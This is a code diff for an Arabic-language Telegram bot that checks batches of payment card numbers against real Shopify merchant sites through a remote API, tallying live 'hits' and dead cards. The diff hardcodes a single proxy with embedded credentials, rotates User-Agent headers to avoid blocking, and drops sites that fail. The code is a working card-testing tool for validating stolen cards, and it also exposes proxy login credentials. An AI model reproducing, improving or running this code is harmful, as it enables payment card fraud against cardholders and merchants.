@@ -16,9 +16,11 @@ bot.remove_webhook()
 
 OWNER_ID = 1013384909  # ضع معرفك هنا
 
+# ==================== البروكسي الوحيد ====================
+FIXED_PROXY = "http://iEN2jEvl:5TqD95Nm664K@proxy.taquito.pp.ua:8080"
+
 # ==================== ملفات التخزين ====================
 SITES_FILE = "sites.json"
-PROXIES_FILE = "proxies.json"
 STATS_FILE = "stats.json"
 
 # تحميل البيانات
@@ -32,16 +34,6 @@ def save_sites(sites):
     with open(SITES_FILE, 'w') as f:
         json.dump(sites, f, indent=4)
 
-def load_proxies():
-    if os.path.exists(PROXIES_FILE):
-        with open(PROXIES_FILE, 'r') as f:
-            return json.load(f)
-    return []
-
-def save_proxies(proxies):
-    with open(PROXIES_FILE, 'w') as f:
-        json.dump(proxies, f, indent=4)
-
 def load_stats():
     if os.path.exists(STATS_FILE):
         with open(STATS_FILE, 'r') as f:
@@ -54,9 +46,7 @@ def save_stats(stats):
 
 # البيانات الافتراضية
 SITES_LIST = load_sites()
-PROXIES_LIST = load_proxies()
 
-# إذا كانت القوائم فارغة، أضف البيانات الافتراضية
 if not SITES_LIST:
     SITES_LIST = [
         "https://makeship.com", "https://dutchwaregear.com", "https://sockbox.com",
@@ -64,19 +54,48 @@ if not SITES_LIST:
     ]
     save_sites(SITES_LIST)
 
-if not PROXIES_LIST:
-    PROXIES_LIST = [
-        "http://iEN2jEvl:5TqD95Nm664K@proxy.taquito.pp.ua:8080",
-        "socks5h://iEN2jEvl:5TqD95Nm664K@proxy.taquito.pp.ua:10080"
-    ]
-    save_proxies(PROXIES_LIST)
-
 # ==================== متغيرات الفحص ====================
 checking_active = False
 checking_thread = None
 current_stats = {"live": 0, "dead": 0, "total": 0, "current": 0, "last_card": "", "last_response": "", "errors": []}
 site_errors = {}
-proxy_errors = {}
+
+# ==================== دالة الطلب مع البروكسي ====================
+def make_request(site, card):
+    """إرسال طلب مع البروكسي - كل طلب يستخدم IP مختلف تلقائياً"""
+    proxy_url = "https://web-production-a8008.up.railway.app/shopify"
+    params = {
+        "site": site,
+        "cc": card,
+        "proxy": FIXED_PROXY
+    }
+    
+    # إعداد الـ Session مع البروكسي
+    session = requests.Session()
+    session.proxies = {
+        'http': FIXED_PROXY,
+        'https': FIXED_PROXY
+    }
+    
+    # هيدرز عشوائية لتجنب الحظر
+    session.headers.update({
+        'User-Agent': random.choice([
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
+            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
+        ]),
+        'Accept': 'application/json',
+        'Accept-Language': 'en-US,en;q=0.9',
+        'Connection': 'keep-alive'
+    })
+    
+    try:
+        response = session.get(proxy_url, params=params, timeout=25)
+        return response.json()
+    except Exception as e:
+        return {"Status": False, "Response": f"ERROR: {str(e)[:50]}"}
+    finally:
+        session.close()
 
 # ==================== لوحة التحكم الرئيسية ====================
 def main_menu():
@@ -90,16 +109,11 @@ def main_menu():
         types.InlineKeyboardButton("🌐 المواقع", callback_data="manage_sites")
     )
     markup.row(
-        types.InlineKeyboardButton("🔌 البروكسيات", callback_data="manage_proxies"),
-        types.InlineKeyboardButton("📁 ملفاتي", callback_data="my_files")
-    )
-    markup.row(
         types.InlineKeyboardButton("⚠️ الأخطاء", callback_data="view_errors"),
         types.InlineKeyboardButton("🔄 تحديث", callback_data="refresh")
     )
     return markup
 
-# ==================== قائمة إدارة المواقع ====================
 def sites_menu():
     markup = types.InlineKeyboardMarkup(row_width=1)
     markup.add(types.InlineKeyboardButton("➕ إضافة موقع", callback_data="add_site"))
@@ -108,22 +122,9 @@ def sites_menu():
     markup.add(types.InlineKeyboardButton("🔙 رجوع", callback_data="back"))
     return markup
 
-# ==================== قائمة إدارة البروكسيات ====================
-def proxies_menu():
-    markup = types.InlineKeyboardMarkup(row_width=1)
-    markup.add(types.InlineKeyboardButton("➕ إضافة بروكسي", callback_data="add_proxy"))
-    markup.add(types.InlineKeyboardButton("📋 قائمة البروكسيات", callback_data="list_proxies"))
-    markup.add(types.InlineKeyboardButton("🗑 حذف بروكسي", callback_data="delete_proxy"))
-    markup.add(types.InlineKeyboardButton("🔙 رجوع", callback_data="back"))
-    return markup
-
-# ==================== شاشة الفحص ====================
 def checking_screen():
-    markup = types.InlineKeyboardMarkup(row_width=2)
-    markup.row(
-        types.InlineKeyboardButton("⏹ إيقاف", callback_data="stop_check"),
-        types.InlineKeyboardButton("🔄 تحديث", callback_data="refresh_check")
-    )
+    markup = types.InlineKeyboardMarkup(row_width=1)
+    markup.add(types.InlineKeyboardButton("⏹ إيقاف الفحص", callback_data="stop_check"))
     return markup
 
 # ==================== الأوامر ====================
@@ -139,9 +140,7 @@ def start_cmd(m):
 ━━━━━━━━━━━━━━━━━━━
 📊 **الإحصائيات الحالية:**
 • 🌐 مواقع نشطة: `{len(SITES_LIST)}`
-• 🔌 بروكسيات نشطة: `{len(PROXIES_LIST)}`
-• ✅ إجمالي الهيتات: `{current_stats['live']}`
-• ❌ إجمالي الديد: `{current_stats['dead']}`
+• 🔌 بروكسي: `نشط`
 
 ━━━━━━━━━━━━━━━━━━━
 💬 أرسل كومبو أو ملف .txt لبدء الفحص
@@ -167,22 +166,6 @@ def save_new_site(m):
         bot.reply_to(m, f"✅ تم إضافة الموقع:\n{site}")
     else:
         bot.reply_to(m, "❌ الموقع موجود بالفعل")
-
-@bot.message_handler(commands=['addproxy'])
-def add_proxy_cmd(m):
-    if m.from_user.id != OWNER_ID:
-        return
-    msg = bot.reply_to(m, "🔌 أرسل البروكسي:\nمثال: http://user:pass@host:port")
-    bot.register_next_step_handler(msg, save_new_proxy)
-
-def save_new_proxy(m):
-    proxy = m.text.strip()
-    if proxy not in PROXIES_LIST:
-        PROXIES_LIST.append(proxy)
-        save_proxies(PROXES_LIST)
-        bot.reply_to(m, f"✅ تم إضافة البروكسي:\n{proxy}")
-    else:
-        bot.reply_to(m, "❌ البروكسي موجود بالفعل")
 
 @bot.message_handler(content_types=['document', 'text'])
 def handle_input(m):
@@ -220,7 +203,6 @@ def handle_input(m):
         "last_card": "", "last_response": "", "errors": []
     }
     site_errors.clear()
-    proxy_errors.clear()
     
     # إرسال شاشة بدء الفحص
     msg = bot.send_message(m.chat.id, f"""
@@ -228,7 +210,7 @@ def handle_input(m):
 ━━━━━━━━━━━━━━━━━━━
 💳 عدد البطاقات: `{total_cards}`
 🌐 مواقع متاحة: `{len(SITES_LIST)}`
-🔌 بروكسيات متاحة: `{len(PROXIES_LIST)}`
+🔌 البروكسي: `مباشر`
 ━━━━━━━━━━━━━━━━━━━
 ⏳ جاري الفحص...
 """, parse_mode="Markdown", reply_markup=checking_screen())
@@ -250,25 +232,15 @@ def run_checking(chat_id, msg_id, cards):
             bot.send_message(chat_id, "❌ لا توجد مواقع متاحة! أضف مواقع أولاً باستخدام /addsite")
             break
         
-        if not PROXIES_LIST:
-            bot.send_message(chat_id, "❌ لا توجد بروكسيات متاحة! أضف بروكسيات أولاً باستخدام /addproxy")
-            break
-        
         site = random.choice(SITES_LIST)
-        proxy = random.choice(PROXIES_LIST)
         current_stats["current"] = idx + 1
         current_stats["last_card"] = card
         
         try:
-            api_url = f"https://web-production-a8008.up.railway.app/shopify?site={site}&cc={card}&proxy={proxy}"
             start_time = time.time()
-            res = requests.get(api_url, timeout=25)
+            data = make_request(site, card)
             elapsed = round(time.time() - start_time, 2)
             
-            if res.status_code != 200:
-                raise Exception(f"HTTP {res.status_code}")
-            
-            data = res.json()
             response_msg = str(data.get("Response", "N/A")).upper()
             status = data.get("Status", False)
             
@@ -291,60 +263,27 @@ def run_checking(chat_id, msg_id, cards):
 """, parse_mode="Markdown")
             else:
                 current_stats["dead"] += 1
+                
+                # حذف المواقع المعطلة
                 if "TIMEOUT" in response_msg or "CONNECTION" in response_msg or "500" in response_msg:
                     if site not in site_errors:
                         site_errors[site] = 0
                     site_errors[site] += 1
-                    if site_errors[site] >= 3:
+                    if site_errors[site] >= 3 and site in SITES_LIST:
                         SITES_LIST.remove(site)
                         save_sites(SITES_LIST)
                         bot.send_message(chat_id, f"⚠️ تم حذف الموقع `{site}` بسبب أخطاء متكررة", parse_mode="Markdown")
-                
-                if "CONNECTION" in response_msg or "TIMEOUT" in response_msg:
-                    if proxy not in proxy_errors:
-                        proxy_errors[proxy] = 0
-                    proxy_errors[proxy] += 1
-                    if proxy_errors[proxy] >= 3:
-                        PROXIES_LIST.remove(proxy)
-                        save_proxies(PROXIES_LIST)
-                        bot.send_message(chat_id, f"⚠️ تم حذف البروكسي `{proxy[:50]}...` بسبب أخطاء متكررة", parse_mode="Markdown")
-            
-        except requests.exceptions.Timeout:
-            current_stats["dead"] += 1
-            error_msg = "TIMEOUT - تأخر الاستجابة"
-            current_stats["errors"].append(f"{card}: {error_msg}")
-            
-            if site not in site_errors:
-                site_errors[site] = 0
-            site_errors[site] += 1
-            if site_errors[site] >= 2:
-                if site in SITES_LIST:
-                    SITES_LIST.remove(site)
-                    save_sites(SITES_LIST)
-                    bot.send_message(chat_id, f"⚠️ تم حذف الموقع `{site}` (تايم أوت متكرر)", parse_mode="Markdown")
-            
-            bot.send_message(chat_id, f"⚠️ **خطأ:** `{card}` → {error_msg}\n🌐 {site}", parse_mode="Markdown")
-            
-        except requests.exceptions.ConnectionError:
-            current_stats["dead"] += 1
-            error_msg = "CONNECTION ERROR - مشكلة في الاتصال"
-            current_stats["errors"].append(f"{card}: {error_msg}")
-            
-            if proxy in PROXIES_LIST:
-                PROXIES_LIST.remove(proxy)
-                save_proxies(PROXIES_LIST)
-                bot.send_message(chat_id, f"⚠️ تم حذف بروكسي معطل: `{proxy[:50]}...`", parse_mode="Markdown")
             
         except Exception as e:
             current_stats["dead"] += 1
             error_msg = f"ERROR: {str(e)[:50]}"
             current_stats["errors"].append(f"{card}: {error_msg}")
-            bot.send_message(chat_id, f"⚠️ **خطأ:** `{card}` → {error_msg}", parse_mode="Markdown")
         
-        # تحديث شاشة التقدم
-        try:
-            progress = int((idx + 1) / len(cards) * 100)
-            bot.edit_message_text(f"""
+        # تحديث شاشة التقدم كل 5 بطاقات
+        if (idx + 1) % 5 == 0 or (idx + 1) == len(cards):
+            try:
+                progress = int((idx + 1) / len(cards) * 100)
+                bot.edit_message_text(f"""
 🚀 **فحص Shopify - مصطفى النجم**
 ━━━━━━━━━━━━━━━━━━━
 📊 **التقدم:** [{idx+1}/{len(cards)}] ({progress}%)
@@ -355,28 +294,32 @@ def run_checking(chat_id, msg_id, cards):
 📝 **الرد:** `{current_stats['last_response'][:30]}`
 ━━━━━━━━━━━━━━━━━━━
 🌐 **مواقع نشطة:** `{len(SITES_LIST)}`
-🔌 **بروكسيات نشطة:** `{len(PROXIES_LIST)}`
 ━━━━━━━━━━━━━━━━━━━
 ⚡ @o8380
 """, chat_id, msg_id, parse_mode="Markdown", reply_markup=checking_screen())
-        except:
-            pass
+            except:
+                pass
         
-        time.sleep(1)  # تأخير بين كل فحص
+        time.sleep(0.5)
     
     checking_active = False
     
     # إرسال التقرير النهائي
+    total_checked = len(cards)
+    if total_checked > 0:
+        hit_rate = round(current_stats['live'] / total_checked * 100, 1)
+    else:
+        hit_rate = 0
+    
     final_report = f"""
 🏁 **تقرير الفحص النهائي**
 ━━━━━━━━━━━━━━━━━━━
-📊 **إجمالي البطاقات:** `{len(cards)}`
+📊 **إجمالي البطاقات:** `{total_checked}`
 ✅ **Hits:** `{current_stats['live']}`
 ❌ **Dead:** `{current_stats['dead']}`
-📈 **نسبة النجاح:** `{round(current_stats['live']/len(cards)*100, 1)}%`
+📈 **نسبة النجاح:** `{hit_rate}%`
 ━━━━━━━━━━━━━━━━━━━
 🌐 **المواقع المتبقية:** `{len(SITES_LIST)}`
-🔌 **البروكسيات المتبقية:** `{len(PROXIES_LIST)}`
 ━━━━━━━━━━━━━━━━━━━
 ⚡ @o8380
 """
@@ -394,56 +337,52 @@ def callback_handler(call):
     elif call.data == "stop_check":
         checking_active = False
         bot.answer_callback_query(call.id, "⏹ تم إيقاف الفحص")
-        bot.edit_message_text("⏹ تم إيقاف الفحص", call.message.chat.id, call.message.message_id, reply_markup=main_menu())
+        try:
+            bot.edit_message_text("⏹ تم إيقاف الفحص", call.message.chat.id, call.message.message_id, reply_markup=main_menu())
+        except:
+            pass
     
     elif call.data == "stats":
-        stats = load_stats()
+        hit_rate = 0
+        if current_stats['total'] > 0:
+            hit_rate = round(current_stats['live'] / current_stats['total'] * 100, 1)
         text = f"""
-📊 **الإحصائيات العامة**
-━━━━━━━━━━━━━━━━━━━
-🔢 إجمالي الفحوصات: `{stats['total_checked']}`
-🎯 إجمالي الهيتات: `{stats['total_hits']}`
-❌ إجمالي الديد: `{stats['total_dead']}`
-━━━━━━━━━━━━━━━━━━━
-🌐 المواقع النشطة: `{len(SITES_LIST)}`
-🔌 البروكسيات النشطة: `{len(PROXIES_LIST)}`
+📊 **الإحصائيات الحالية**
 ━━━━━━━━━━━━━━━━━━━
 📊 **آخر فحص:**
 ✅ Hits: `{current_stats['live']}`
 ❌ Dead: `{current_stats['dead']}`
+📈 نسبة النجاح: `{hit_rate}%`
+━━━━━━━━━━━━━━━━━━━
+🌐 المواقع النشطة: `{len(SITES_LIST)}`
+━━━━━━━━━━━━━━━━━━━
+🔌 البروكسي: `نشط`
 """
-        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, parse_mode="Markdown", reply_markup=main_menu())
+        try:
+            bot.edit_message_text(text, call.message.chat.id, call.message.message_id, parse_mode="Markdown", reply_markup=main_menu())
+        except:
+            pass
     
     elif call.data == "manage_sites":
-        bot.edit_message_text("🌐 **إدارة المواقع**\n━━━━━━━━━━━━━━━━━━━", call.message.chat.id, call.message.message_id, parse_mode="Markdown", reply_markup=sites_menu())
-    
-    elif call.data == "manage_proxies":
-        bot.edit_message_text("🔌 **إدارة البروكسيات**\n━━━━━━━━━━━━━━━━━━━", call.message.chat.id, call.message.message_id, parse_mode="Markdown", reply_markup=proxies_menu())
+        try:
+            bot.edit_message_text("🌐 **إدارة المواقع**\n━━━━━━━━━━━━━━━━━━━", call.message.chat.id, call.message.message_id, parse_mode="Markdown", reply_markup=sites_menu())
+        except:
+            pass
     
     elif call.data == "list_sites":
         if SITES_LIST:
             sites_text = "\n".join([f"• {s}" for s in SITES_LIST[:20]])
             if len(SITES_LIST) > 20:
                 sites_text += f"\n...و{len(SITES_LIST)-20} موقع آخر"
-            bot.edit_message_text(f"📋 **قائمة المواقع ({len(SITES_LIST)}):**\n━━━━━━━━━━━━━━━━━━━\n{sites_text}", call.message.chat.id, call.message.message_id, parse_mode="Markdown", reply_markup=sites_menu())
+            try:
+                bot.edit_message_text(f"📋 **قائمة المواقع ({len(SITES_LIST)}):**\n━━━━━━━━━━━━━━━━━━━\n{sites_text}", call.message.chat.id, call.message.message_id, parse_mode="Markdown", reply_markup=sites_menu())
+            except:
+                pass
         else:
-            bot.edit_message_text("❌ لا توجد مواقع حالياً", call.message.chat.id, call.message.message_id, reply_markup=sites_menu())
-    
-    elif call.data == "list_proxies":
-        if PROXIES_LIST:
-            proxies_text = "\n".join([f"• {p[:60]}..." for p in PROXIES_LIST[:10]])
-            bot.edit_message_text(f"📋 **قائمة البروكسيات ({len(PROXIES_LIST)}):**\n━━━━━━━━━━━━━━━━━━━\n{proxies_text}", call.message.chat.id, call.message.message_id, parse_mode="Markdown", reply_markup=proxies_menu())
-        else:
-            bot.edit_message_text("❌ لا توجد بروكسيات حالياً", call.message.chat.id, call.message.message_id, reply_markup=proxies_menu())
+            bot.answer_callback_query(call.id, "❌ لا توجد مواقع")
     
     elif call.data == "add_site":
-        msg = bot.send_message(call.message.chat.id, "🌐 أرسل رابط الموقع:\nمثال: https://example.com")
-        bot.register_next_step_handler(msg, save_new_site)
-        bot.delete_message(call.message.chat.id, call.message.message_id)
-    
-    elif call.data == "add_proxy":
-        msg = bot.send_message(call.message.chat.id, "🔌 أرسل البروكسي:\nمثال: http://user:pass@host:port")
-        bot.register_next_step_handler(msg, save_new_proxy)
+        bot.send_message(call.message.chat.id, "🌐 أرسل رابط الموقع:")
         bot.delete_message(call.message.chat.id, call.message.message_id)
     
     elif call.data == "delete_site":
@@ -452,54 +391,45 @@ def callback_handler(call):
             for site in SITES_LIST[:10]:
                 markup.add(types.InlineKeyboardButton(f"🗑 {site[:40]}", callback_data=f"del_site_{site}"))
             markup.add(types.InlineKeyboardButton("🔙 رجوع", callback_data="manage_sites"))
-            bot.edit_message_text("🗑 **اختر موقعاً للحذف:**", call.message.chat.id, call.message.message_id, reply_markup=markup)
+            try:
+                bot.edit_message_text("🗑 **اختر موقعاً للحذف:**", call.message.chat.id, call.message.message_id, reply_markup=markup)
+            except:
+                pass
         else:
             bot.answer_callback_query(call.id, "❌ لا توجد مواقع للحذف")
-    
-    elif call.data == "delete_proxy":
-        if PROXIES_LIST:
-            markup = types.InlineKeyboardMarkup(row_width=1)
-            for i, proxy in enumerate(PROXIES_LIST[:10]):
-                markup.add(types.InlineKeyboardButton(f"🗑 Proxy #{i+1}", callback_data=f"del_proxy_{i}"))
-            markup.add(types.InlineKeyboardButton("🔙 رجوع", callback_data="manage_proxies"))
-            bot.edit_message_text("🗑 **اختر بروكسياً للحذف:**", call.message.chat.id, call.message.message_id, reply_markup=markup)
-        else:
-            bot.answer_callback_query(call.id, "❌ لا توجد بروكسيات للحذف")
     
     elif call.data.startswith("del_site_"):
         site = call.data[9:]
         if site in SITES_LIST:
             SITES_LIST.remove(site)
             save_sites(SITES_LIST)
-            bot.answer_callback_query(call.id, f"✅ تم حذف: {site[:40]}")
-            bot.edit_message_text("🌐 **إدارة المواقع**\n━━━━━━━━━━━━━━━━━━━", call.message.chat.id, call.message.message_id, parse_mode="Markdown", reply_markup=sites_menu())
-    
-    elif call.data.startswith("del_proxy_"):
-        idx = int(call.data[10:])
-        if idx < len(PROXIES_LIST):
-            removed = PROXIES_LIST.pop(idx)
-            save_proxies(PROXIES_LIST)
-            bot.answer_callback_query(call.id, f"✅ تم حذف البروكسي")
-        bot.edit_message_text("🔌 **إدارة البروكسيات**\n━━━━━━━━━━━━━━━━━━━", call.message.chat.id, call.message.message_id, parse_mode="Markdown", reply_markup=proxies_menu())
+            bot.answer_callback_query(call.id, f"✅ تم حذف الموقع")
+            try:
+                bot.edit_message_text("🌐 **إدارة المواقع**\n━━━━━━━━━━━━━━━━━━━", call.message.chat.id, call.message.message_id, parse_mode="Markdown", reply_markup=sites_menu())
+            except:
+                pass
     
     elif call.data == "view_errors":
         if current_stats["errors"]:
             errors_text = "\n".join(current_stats["errors"][-10:])
-            bot.edit_message_text(f"⚠️ **أخر 10 أخطاء:**\n━━━━━━━━━━━━━━━━━━━\n{errors_text}", call.message.chat.id, call.message.message_id, parse_mode="Markdown", reply_markup=main_menu())
+            try:
+                bot.edit_message_text(f"⚠️ **أخر 10 أخطاء:**\n━━━━━━━━━━━━━━━━━━━\n{errors_text}", call.message.chat.id, call.message.message_id, parse_mode="Markdown", reply_markup=main_menu())
+            except:
+                pass
         else:
-            bot.edit_message_text("✅ لا توجد أخطاء", call.message.chat.id, call.message.message_id, reply_markup=main_menu())
-    
-    elif call.data == "refresh_check":
-        bot.answer_callback_query(call.id, "🔄 تم التحديث")
+            bot.answer_callback_query(call.id, "✅ لا توجد أخطاء")
     
     elif call.data == "back":
-        bot.edit_message_text("✅ الرئيسية", call.message.chat.id, call.message.message_id, reply_markup=main_menu())
+        try:
+            bot.edit_message_text("✅ الرئيسية", call.message.chat.id, call.message.message_id, reply_markup=main_menu())
+        except:
+            pass
     
     elif call.data == "refresh":
-        bot.edit_message_text("✅ تم التحديث", call.message.chat.id, call.message.message_id, reply_markup=main_menu())
-    
-    elif call.data == "my_files":
-        bot.answer_callback_query(call.id, "📁 أرسل ملف .txt لفحصه")
+        try:
+            bot.edit_message_text("✅ تم التحديث", call.message.chat.id, call.message.message_id, reply_markup=main_menu())
+        except:
+            pass
 
 # ==================== تشغيل البوت ====================
 print("""
@@ -510,7 +440,7 @@ print("""
 ╚══════════════════════════════════════╝
 """)
 print(f"✅ المواقع المحملة: {len(SITES_LIST)}")
-print(f"✅ البروكسيات المحملة: {len(PROXIES_LIST)}")
+print(f"🔌 البروكسي: {FIXED_PROXY[:50]}...")
 print("🚀 البوت يعمل الآن...")
 
 bot.infinity_polling(timeout=30)
